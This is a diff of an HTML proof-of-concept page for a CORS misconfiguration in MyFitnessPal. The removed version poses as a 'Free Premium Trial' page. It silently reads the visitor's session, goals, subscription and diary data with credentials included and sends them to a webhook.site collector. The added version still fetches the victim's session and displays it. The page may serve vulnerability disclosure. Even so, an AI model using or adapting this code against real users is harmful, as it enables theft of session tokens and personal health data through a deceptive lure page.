@@ -1,60 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>Free Premium Trial</title></head>
+<head><title>MFP CORS PoC</title></head>
 <body>
-<h2>Claiming your free trial...</h2>
-<div id="log"></div>
-<pre id="output" style="word-wrap:break-word;white-space:pre-wrap;font-size:11px;"></pre>
+<h1>MyFitnessPal CORS Misconfiguration PoC</h1>
+<p>If you are logged into MyFitnessPal, your data will appear below:</p>
+<pre id="output">Fetching...</pre>
 <script>
-const exfil = "https://webhook.site/6e09acf4-6781-452a-87e7-9351b357f208";
-const log = document.getElementById("log");
-const output = document.getElementById("output");
-
-function addLog(msg) {
-  log.innerHTML += "<p>" + msg + "</p>";
-}
-
-async function steal() {
-  try {
-    const session = await fetch("https://www.myfitnesspal.com/api/auth/session", {
-      credentials: "include"
-    }).then(r => r.json());
-    addLog("Session: " + JSON.stringify(session));
-
-    const goals = await fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {
-      credentials: "include"
-    }).then(r => r.json());
-    addLog("Goals: " + JSON.stringify(goals).substring(0, 100));
-
-    const subs = await fetch("https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en", {
-      credentials: "include"
-    }).then(r => r.json());
-    addLog("Subs: " + JSON.stringify(subs).substring(0, 100));
-
-    const diary = await fetch("https://www.myfitnesspal.com/api/services/account/diary_settings", {
-      credentials: "include"
-    }).then(r => r.json());
-    addLog("Diary settings: " + JSON.stringify(diary).substring(0, 100));
-
-    const payload = {
-      session: session,
-      goals: goals,
-      subscriptions: subs,
-      diary_settings: diary
-    };
-
-    output.textContent = JSON.stringify(payload, null, 2);
-
-    const data = encodeURIComponent(JSON.stringify(payload));
-    new Image().src = exfil + "?data=" + data;
-    addLog("Sent!");
-
-  } catch(e) {
-    addLog("Error: " + e.message);
-  }
-}
-
-steal();
+fetch('https://www.myfitnesspal.com/api/auth/session', {
+  credentials: 'include',
+  headers: {'Accept': 'application/json'}
+})
+.then(r => r.json())
+.then(data => {
+  document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+})
+.catch(e => {
+  document.getElementById('output').textContent = 'Error: ' + e;
+});
 </script>
 </body>
 </html>
